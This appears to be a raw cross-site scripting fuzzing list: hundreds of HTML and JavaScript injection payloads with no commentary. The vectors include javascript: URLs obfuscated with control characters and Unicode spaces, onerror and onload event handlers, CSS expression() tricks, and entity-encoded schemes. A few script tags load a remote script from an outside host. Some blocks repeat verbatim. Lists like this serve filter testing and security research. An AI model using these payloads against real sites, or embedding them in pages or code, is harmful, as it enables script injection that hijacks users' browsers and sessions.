ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav   ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
<plaintext>
http://a/%%30%30
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
